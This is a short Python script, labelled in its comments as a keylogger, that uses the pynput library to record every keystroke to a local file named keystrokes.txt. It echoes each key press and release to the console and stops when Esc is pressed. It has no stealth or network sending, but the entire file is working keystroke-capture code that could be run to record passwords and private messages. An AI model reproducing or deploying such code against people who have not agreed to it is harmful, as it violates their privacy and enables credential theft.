from pynput import keyboard # type: ignore
import time

# Create a file to store the keystrokes
file = open("keystrokes.txt", "w")

def on_press(key):
    # Capitalize letters and ignore special keys
    if key == keyboard.Key.space:
        file.write(" ")
    elif key == keyboard.Key.shift:
        file.write("shift")
    elif key == keyboard.Key.shift_r:
        file.write("shift")
    elif key == keyboard.Key.backspace:
        file.write("backspace")
    elif key == keyboard.Key.ctrl_l:
        file.write("ctrl")
    elif key == keyboard.Key.ctrl_r:
        file.write("ctrl")
    elif key == keyboard.Key.alt_l:
        file.write("alt")
    elif key == keyboard.Key.alt_r:
        file.write("alt")
    elif key == keyboard.Key.enter:
        file.write("\n")
    elif key == keyboard.Key.tab:
        file.write("\t")
    else:
        try:
            file.write(key.char)
        except AttributeError:
            pass
    print("Key pressed:", key)

def on_release(key):
    print("Key released:", key)
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Close the file
file.close()
